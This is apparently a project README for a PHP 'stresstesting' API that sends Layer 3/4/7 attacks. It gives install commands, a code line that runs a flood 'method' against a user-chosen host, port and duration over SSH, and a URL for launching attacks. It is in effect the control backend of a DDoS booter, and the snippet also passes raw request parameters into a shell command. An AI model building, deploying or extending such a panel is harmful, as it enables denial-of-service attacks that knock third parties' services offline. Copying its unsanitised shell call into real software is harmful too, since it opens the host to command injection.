# stresstesting-api-ssh
An SSH PHP API for Layer 3/4/7 attacks

Install
Ubuntu/Debian:

apt update -y

apt install php php-ssh2 php-fpm apache2 screen -y

service apache2 restart

Upload file api.php to /var/www/html

Usage
Replace Server IP, Username and Password with your server info. Change the API Key Change the methods usage.

Add more methods
if($method == "METHOD"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./METHOD $host $port 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}

You have to find your own methods for this api to work rename them as nesscessary and add more as nesscessary

How to use
http://serverip/api.php?key=superkey&host=[host]&port=[port]&time=[time]&method=[method]

